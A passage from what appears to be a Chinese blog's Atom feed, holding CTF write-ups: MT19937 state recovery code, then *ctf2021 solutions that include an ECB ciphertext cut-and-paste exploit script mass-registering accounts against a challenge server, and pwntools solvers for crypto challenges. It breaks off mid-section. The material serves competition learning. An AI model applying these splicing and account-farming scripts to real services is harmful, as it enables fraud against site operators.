class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">unBitShift</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">RightXor</span>(<span class="params">self,value,shift,bits=<span class="number">32</span></span>):</span><br><span class="line">        tmp = value</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = value ^ tmp &gt;&gt; shift</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">RightXorMasked</span>(<span class="params">self,value,shift,mask,bits=<span class="number">32</span></span>):</span><br><span class="line">        tmp = value</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = value ^ tmp &gt;&gt; shift &amp; mask</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">LeftXor</span>(<span class="params">self,value, shift,bits=<span class="number">32</span></span>):</span><br><span class="line">        tmp = value</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = value ^ tmp &lt;&lt; shift</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">LeftXorMasked</span>(<span class="params">self,value, shift, mask,bits=<span class="number">32</span></span>):</span><br><span class="line">        tmp = value</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = value ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br></pre></td></tr></table></figure><h3 id="2-逆向Twist"><a href="#2-逆向Twist" class="headerlink" title="2.逆向Twist"></a>2.逆向Twist</h3><p>观察<code>twist</code>函数，可知新的<code>state[i]</code>只和原来的<code>state[i]</code>、<code>state[i+1]</code>与<code>state[i+397]</code>有关，首先异或掉<code>state[i+397]</code>，之后我们讨论是否将结果与<code>0x9908b0df</code>异或，因为<code>0x9908b0df=0b10011001000010001011000011011111</code>，又因为<code>y&gt;&gt;1</code>操作得知之前的数的高位一定是<code>0</code>，所以我们之间判断最高位即可知道是否需要异或<code>0x9908b0df</code>，也就是能得知原来<code>state[i]</code>的最高位，那么再对<code>state[i-1]</code>进行还原，即可得到完整的<code>state[i]</code>了，具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">cur</span>):</span><br><span class="line">    high = <span class="number">0x80000000</span></span><br><span class="line">    low = <span class="number">0x7fffffff</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span></span><br><span class="line">    state = cur</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">623</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        tmp = state[i]^state[(i+<span class="number">397</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y(tmp)</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="comment"># recover highest bit</span></span><br><span class="line">        res = tmp&amp;high</span><br><span class="line">        <span class="comment"># recover other 31 bits</span></span><br><span class="line">        tmp = state[i-<span class="number">1</span>]^state[(i+<span class="number">396</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y(tmp)</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        res |= (tmp)&amp;low</span><br><span class="line">        state[i] = res    </span><br><span class="line">    <span class="keyword">return</span> state</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;A-study-for-MT19937&quot;&gt;&lt;a href=&quot;#A-study-for-MT19937&quot; class=&quot;headerlink&quot; title=&quot;A study for MT19937&quot;&gt;&lt;/a&gt;A study for MT19937&lt;/h1&gt;&lt;p&gt;寒假前被一个伪随机数卡了，终于有时间来看看&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Write up for *ctf2021</title>
    <link href="http://example.com/2021/01/19/Wp_for_%E6%98%9Fctf&#39;s_crypto/"/>
    <id>http://example.com/2021/01/19/Wp_for_%E6%98%9Fctf&#39;s_crypto/</id>
    <published>2021-01-19T05:57:11.000Z</published>
    <updated>2021-03-11T01:20:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WP-for-ctf2021"><a href="#WP-for-ctf2021" class="headerlink" title="WP for *ctf2021"></a>WP for *ctf2021</h1><p>第一次和V&amp;N的师傅们打比赛就冲到了第六，好耶！</p><p>最后没AK，不好（悲）</p><span id="more"></span><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="lottery-again"><a href="#lottery-again" class="headerlink" title="lottery again"></a>lottery again</h3><p>看源码，找关键代码</p><p>加密部分</p><p><img src="https://i.loli.net/2021/01/19/ouXmL1yckdJHZzE.png" alt="29.png"></p><p>解密部分</p><p><img src="https://i.loli.net/2021/01/19/DpU1AXfdM6HBFQE.png" alt="30.png"></p><p>兑换彩票部分</p><p><img src="https://i.loli.net/2021/01/19/21UeVbGj9Cn6haf.png" alt="31.png"></p><p>分析函数可以发现在兑换彩票的时候，会对彩票密文进行解码，通过解码得到的彩票lottery内容从数据库中找到对应数据，取得可兑换的coin数量，并把coin加到解码得到的user账号的硬币中。</p><p>分析代码可知，从密文中取得的user账号没有与在数据库中的信息进行验证，故如果我们可以篡改密文中对应的user信息，那么就可以让a用户购买的彩票，给b用户使用，从而让b用户达到白嫖的目的。</p><p>我们发现加密方式为MCRYPT_RIJNDAEL_256，ECB模式，通过手动测试发现该算法的分组方式为32字节为一组，在这样的前提下，我们可以尝试替换储存在其中的user数据。</p><p>以下来逐步分析如何替换全部user-uuid信息</p><p>我们已有的密文数据是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">a46-58a00645c3e4&quot;,&quot;user&quot;:&quot;111111</span><br><span class="line">11-1111-1111-1111-111111111111&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;demodemo-demo-demo-d</span><br><span class="line">emo-demodemodemo&quot;,&quot;user&quot;:&quot;222222</span><br><span class="line">22-2222-2222-2222-222222222222&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>如下为一个加密数据的明文内容，每一行的长度为0x20（除最后一行外</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">a46-58a00645c3e4&quot;,&quot;user&quot;:&quot;111111</span><br><span class="line">11-1111-1111-1111-111111111111&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>我们想要把其替换为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">a46-58a00645c3e4&quot;,&quot;user&quot;:&quot;222222</span><br><span class="line">22-2222-2222-2222-222222222222&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>也就是把user信息都从1替换成2 但是我们只可以替换其中的任何一个一行的内容，才不会造成解密错误。于是我们自然可以考虑替换第三行的内容，其标志着该彩票购买者的部分uuid信息。但是由于只是部分uuid信息，所以即使替换了也是如下情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">a46-58a00645c3e4&quot;,&quot;user&quot;:&quot;111111</span><br><span class="line">22-2222-2222-2222-222222222222&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>其user信息中的前六个字节无法被替换，由于六字节内容过长，不适合用爆破的方法来绕过。 但是如果我们考虑要把前六字节的信息也要替换的话，那么必须同时替换那一行的全部内容，也就是就会变成以下情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">emo-demodemodemo&quot;,&quot;user&quot;:&quot;222222</span><br><span class="line">22-2222-2222-2222-222222222222&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>也就是会造成lottery信息被替换，这会造成该彩票无法从数据库中读取到，直接报错。 最终考虑到以下构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">a46-58a00645c3e4&quot;,&quot;user&quot;:&quot;111111</span><br><span class="line">emo-demodemodemo&quot;,&quot;user&quot;:&quot;222222</span><br><span class="line">22-2222-2222-2222-222222222222&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>由于在php在json_decode的时候，后面的user会覆盖前面的user，也就是正确的user可以覆盖错误的user，成功修改user信息。</p><p>其他部分就是，需要注册、登录、购买、彩票、兑换彩票，可以写个脚本使其自动化。代码中的target为最终要用于购买flag的账号的一个彩票密文数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">&quot;http://52.149.144.45:8080&quot;</span></span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getheaders</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;Cookie&quot;</span> : <span class="string">&quot;api_token=&quot;</span> + token&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reg</span>(<span class="params">user, pwd</span>):</span><br><span class="line">    text = req.post(url + <span class="string">&quot;/user/register&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: user, <span class="string">&quot;password&quot;</span>: pwd&#125;).text</span><br><span class="line">    data = json.loads(text)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">user, pwd</span>):</span><br><span class="line">    text = req.post(url + <span class="string">&quot;/user/login&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: user, <span class="string">&quot;password&quot;</span>: pwd&#125;).text</span><br><span class="line">    data = json.loads(text)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">token</span>):</span><br><span class="line">    text = req.post(url + <span class="string">&quot;/lottery/buy&quot;</span>, data=&#123;<span class="string">&quot;api_token&quot;</span>: token&#125;).text</span><br><span class="line">    data = json.loads(text)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hijack</span>(<span class="params">enc, enc2</span>):</span><br><span class="line">    enc = base64.b64decode(enc)</span><br><span class="line">    enc2 = base64.b64decode(enc2)</span><br><span class="line">    <span class="keyword">return</span> enc[:<span class="number">0x40</span>] + enc2[<span class="number">0x20</span>:<span class="number">0x60</span>] + enc[<span class="number">0x60</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getInfo</span>(<span class="params">enc</span>):</span><br><span class="line">    text = req.post(url + <span class="string">&quot;/lottery/info&quot;</span>, data=&#123;<span class="string">&quot;enc&quot;</span>: enc&#125;).text</span><br><span class="line">    data = json.loads(text)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">charge</span>(<span class="params">user, coin, enc</span>):</span><br><span class="line">    text = req.post(url + <span class="string">&quot;/lottery/charge&quot;</span>, data=&#123;<span class="string">&quot;user&quot;</span>: user, <span class="string">&quot;enc&quot;</span> : enc, <span class="string">&quot;coin&quot;</span> : coin&#125;).text</span><br><span class="line">    data = json.loads(text)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;***************jjXj40HxYWzD7/wbbu6LB8hKIgHzspmlNP0zCwC07w6uK7rCLP2MvVoq8P2oXt+OoD1NY2Ba5J5Hs1AiZkdxBRIrTSq9H8y2BmPiCmO6fH2d9eJW+rk8BfTg14RVjLwF1pW5cSqW2FXVyWb0j5c8edRkKKGE=&#x27;</span></span><br><span class="line">uuid = getInfo(target)[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    reg_data = reg(<span class="string">&#x27;wjhflag&#x27;</span> + <span class="built_in">str</span>(i), <span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line">    login_data = login(<span class="string">&#x27;wjhflag&#x27;</span> + <span class="built_in">str</span>(i), <span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line">    token = login_data[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;api_token&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        buy_data = buy(token)</span><br><span class="line">        enc = buy_data[<span class="string">&#x27;enc&#x27;</span>]</span><br><span class="line">        fake_enc = base64.b64encode(hijack(enc, target))</span><br><span class="line">        data = charge(uuid, <span class="number">0</span>, fake_enc)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="GuessKey"><a href="#GuessKey" class="headerlink" title="GuessKey"></a>GuessKey</h3><p>憨憨出题人把key给出来了，<del>猜</del>（复制）数字</p><h3 id="GuessKey2"><a href="#GuessKey2" class="headerlink" title="GuessKey2"></a>GuessKey2</h3><p>GuessKey_fix <del>其实就是不给key了</del></p><p>先分析题目，看起来是要让我们去猜这个<code>key</code>，但显然不可能成功</p><p>接着看下面发现我们每次可以给服务器发送一个<code>mask</code>，来对这个<code>key</code>进行改变，而改变的位置是<code>key</code>中<code>0</code>所在的位置随机选两个的区间来与<code>mask</code>异或，那么也就是说，每次选取的起止位置都是<code>0</code>，那么也就是说每一次的<code>mask</code>都会影响到这两个<code>0</code></p><p>我们选择<code>mask</code>每一次都打<code>1</code>，这样每次的这两个<code>0</code>都会被异或成<code>1</code>（虽然有些地方也变成了<code>0</code>），但是相较于上一个状态，<code>0</code>的区间是被缩小了的，也就是说，在有限次的<code>mask</code>处理过后，<code>key</code>会变成<code>0b1111111111111111111111111111111111111111111111111111111111111111</code>，所以我们每次的<code>guess</code>就可以作为检测，当我们得到<code>Nice.</code>时，也就可以得知此时的<code>key</code>是<code>0b1111111111111111111111111111111111111111111111111111111111111111</code>，相当于<code>key</code>已知，和<code>GuessKey</code>就变成了一道题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;52.163.228.53&quot;</span>, <span class="string">&quot;8082&quot;</span>)</span><br><span class="line">turn = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    turn += <span class="number">1</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;mask:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;guess:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;18446744073709551615&#x27;</span>)</span><br><span class="line">    back = r.recvline(<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(turn,back)</span><br><span class="line">    <span class="keyword">if</span>(back == <span class="string">b&#x27;Nice.&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;mask:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;guess:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;18446744073709551615&#x27;</span>)</span><br><span class="line">    back = r.recvline(<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(turn,back)</span><br><span class="line"></span><br><span class="line">flag = r.recvline(<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="MyEnc"><a href="#MyEnc" class="headerlink" title="MyEnc"></a>MyEnc</h3><p>这个题把<code>flag</code>当成<code>key</code>，对于我们给出的每个数字根据<code>key</code>的接下来6位对<code>iv</code>进行操作，因为我们已知<code>flag</code>的格式为<code>*CTF&#123;...&#125;</code>，所以我们对于<code>key</code>的前几十位是已知的，所以可以通过前几次操作来得到我们想要的东西</p><p>因为返回的值是 $iv+(m ⊕ q)^{i^{i^i}}$ ，我们简记为 $iv+(m⊕q)^{x}$ ，那么我们可以两次令<code>m</code>为0，得到数的即为 $iv+q^x$ 与 $iv+q^y$ ，可知 $q &#x3D; gcd(n,(iv+q^x)-(iv+q^y))$ ，那么<code>n</code>就可以被轻松分解</p><p>接着我们可以令<code>m</code>等于<code>q</code>，这样就可以得到<code>iv</code></p><p>接下来再令<code>m</code>等于0（其实等于几都能算，等于0方便点而已），由于<code>iv</code>、<code>q</code>全部已知，而且状态不超过 $2^7$ ，即可爆破状态，即为此时的6位<code>key</code></p><p>手动补全前几位的<code>key</code>，然后不断通过爆破得到接下来的6位<code>key</code>，当<code>key</code>的长度达到120时，前120位即为<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">r = remote(<span class="string">&quot;52.163.228.53&quot;</span>, <span class="string">&quot;8081&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">passpow</span>():</span><br><span class="line">rev = r.recvuntil(<span class="string">&quot;sha256(xxxx+&quot;</span>)</span><br><span class="line">suffix = r.recv(<span class="number">16</span>).decode()</span><br><span class="line">r.recvuntil(<span class="string">&quot; == &quot;</span>)</span><br><span class="line">res = r.recv(<span class="number">64</span>).decode()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">hashresult = hashlib.sha256((x+suffix).encode()).hexdigest()</span><br><span class="line"><span class="keyword">if</span> hashresult == res:</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">prefix = util.iters.mbruteforce(f,table,<span class="number">4</span>,<span class="string">&#x27;upto&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Give me xxxx:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(prefix))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">talk</span>(<span class="params">x</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;give me a number:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(x))</span><br><span class="line">r.recvuntil(<span class="string">&quot;done: &quot;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(r.recvline(<span class="literal">False</span>).strip().decode())</span><br><span class="line"></span><br><span class="line">passpow()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Successfully pass the pow!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;n: &quot;</span>)</span><br><span class="line">n = <span class="built_in">int</span>(r.recvline(<span class="literal">False</span>).strip().decode())</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line">a = talk(<span class="number">0</span>)</span><br><span class="line">b = talk(<span class="number">0</span>)</span><br><span class="line">delta = b+n-a</span><br><span class="line"></span><br><span class="line">q = gcd(delta,n)</span><br><span class="line"><span class="keyword">assert</span> q != <span class="number">1</span></span><br><span class="line">p = n // q</span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line"></span><br><span class="line">iv = talk(q)</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">elist = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">elist.append(<span class="built_in">pow</span>(i,<span class="built_in">pow</span>(i,i,phi),phi))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;001010100100001101010&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">len</span>(flag)&lt;<span class="number">120</span>):</span><br><span class="line">delta = talk(<span class="number">0</span>) - iv</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">tmp = <span class="built_in">bin</span>(i)[<span class="number">2</span>:].rjust(<span class="number">7</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)):</span><br><span class="line"><span class="keyword">if</span>(tmp[j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">res += <span class="built_in">pow</span>(q,elist[j],n)</span><br><span class="line">res %= n</span><br><span class="line"><span class="keyword">if</span>(delta%n == res):</span><br><span class="line">flag += <span class="built_in">bin</span>(i)[<span class="number">2</span>:].rjust(<span class="number">7</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].rjust(<span class="number">7</span>,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">flag = flag[:<span class="number">120</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(flag,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="little-case"><a href="#little-case" class="headerlink" title="little case"></a>little case</h3><p>题目分为两部分，一个是<code>little_trick</code>，一个是<code>real_trick</code></p><p>阅读代码后发现<code>little_trick</code>就是<code>RSA</code>的<code>wiener attack</code>，最后即可分解<code>n</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 